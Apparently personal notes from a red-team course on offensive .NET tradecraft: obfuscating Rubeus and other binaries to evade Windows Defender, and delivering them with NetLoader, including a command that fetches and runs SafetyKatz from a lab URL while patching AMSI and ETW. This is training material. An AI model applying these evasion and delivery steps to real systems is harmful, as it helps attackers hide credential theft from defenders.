#### Offensive .NET - Introduction
- Currently, .NET lacks some of the security features implemented in System.Management.Automation.dll.
- Because of this, many Red teams have included .NET in their tradecraft.
- There are many open source Offensive .NET tools and we will use the ones that fit our attack methodology.

#### Offensive .NET - Tradecraft
- When using .NET (or any other compiled language) there are some challenges
	- Detection by countermeasures like AV, EDR etc.
	- Delivery of the payload (Recall PowerShell's sweet download-execute cradles)
	- Detection by logging like process creation logging, command line logging etc.
- We will try and address the AV detection and delivery of the payload as and when required during the class ;)
- You are on your own when the binaries that we share start getting detected by Windows Defender!

#### Offensive .NET - Tradecraft - AV bypass
- We will focus mostly on bypass of signature-based detection by Windows Defender.
- For that, we can use techniques like Obfuscation, String Manipulation etc.
- We can again use DefenderCheck to identify code and strings from a binary that Windows Defender may flag.
- This helps us in deciding on modifying the source code and minimal obfuscation.
- We can also use source code obfuscation.

#### Offensive .NET - Tradecraft - AV bypass – Source Code Obfuscation
##### Source Code Obfuscation Using Codecepticon (https://github.com/Accenture/Codecepticon)
- Tools such as Codecepticon can also obfuscate the source code to bypass any signature-related detection.
- Codecepticon needs to be compiled in Visual Studio and it’s command line generator can help generate an obfuscation command quickly.
- Using Codecepticon:
	- Compile the project in Visual Studio and navigate to the output directory, to open the CommandLineGenerator.html file.
	- Here, you can decide how you want to obfuscate the source code.
	- ![[Pasted image 20250320193241.png]]
	- You can also use the following command to obfuscate the source code with Codecepticon:
		- `C:\AD\Tools\Codecepticon.exe --action obfuscate --module csharp --verbose --path "C:\AD\Tools\Rubeus-master\Rubeus.sln" --map-file "C:\AD\Tools\Rubeus-master\Mapping.html" --profile rubeus --rename ncefpavs --rename-method markov --markov-min-length 3 --markov-max-length 10 --markov-min-words 3 --markov-max-words 5 --string-rewrite --string-rewrite-method xor`
##### Source Code Obfuscation Using ConfuserEx (https://mkaring.github.io/ConfuserEx/)
- A great tool to obfuscate the compiled binary is ConfuserEx
- ConfuserEx is a free .NET obfuscator, which can stop AVs from performing signature based detection.
- ![[Pasted image 20250320193628.png]]
- Using ConfuserEx:
	- If not present on system, download ConfuserEx GUI from the “Releases” page and simply run it.
	- On Student VM, you can run ConfuserEx GUI from C:\AD\Tools directory.
	- Add the Release folder of the compiled binary to ConfuserEx.
	- ![[Pasted image 20250320193927.png]]
	- Add a new Rule in the settings page
	- ![[Pasted image 20250320193938.png]]
	- Double click the rule and set the preset to “Maximum”
	- ![[Pasted image 20250320193949.png]]
	- Finally, in the protect page, click "Protect!" to produce the obfuscated binary.
	- ![[Pasted image 20250320194009.png]]
	- Verify with DefenderCheck.

#### Offensive .NET - Tradecraft - Payload Delivery
##### using NetLoader (https://gist.github.com/Arno0x/2b223114a726be3c5e7a9cacd25053a2) with CsWhispers and Nimcrypt2
- We can use NetLoader to deliver our binary payloads.
- It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
	- `C:\Users\Public\Loader.exe -path http://172.16.100.X/SafetyKatz.exe`
- We are using NetLoader with CsWhispers project to add D/Invoke and indirect syscall execution as NetLoader uses classic Process Injection WinAPIs which is flagged on basic import table analysis.
- Steps to use Loader with CsWhispers:
	- Download CsWhispers, open it in Visual Studio and Check 'Allow unsafe code' under build configuration..
	- ![[Pasted image 20250320195129.png]]
	- Create a new file called CsWhispers.txt under CsWhispers.Sample and append NT API and struct equivalents that are required to be replaced in the NetLoader project.
	- ![[Pasted image 20250320195149.png]]
	- Finally, append the NetLoader project into CSWhispers.Sample and replace appropriate WinAPIs with their NT equivalents. An example replacement for the VirtualProtect WINAPI can be found below. Build the solution.
	- ![[Pasted image 20250320195207.png]]
	- ![[Pasted image 20250320195212.png]]
	- Obfuscate the generated assembly using Nimcrypt2.
		- `kali> ./nimcrypt -f CSWhispers.Sample.exe -e -n -s --no-ppid-spoof -o Loader.exe -t csharp`
		- Flags used:
			- `-e: Encrypt strings using the strenc module`
			- `-n: Disable syscall name randomization`
			- `-s: Disable sandbox checks`
			- `--no-ppid-spoof: Disable PPID Spoofing`
			- `-t: Type of file`
			- `-o: Output filename`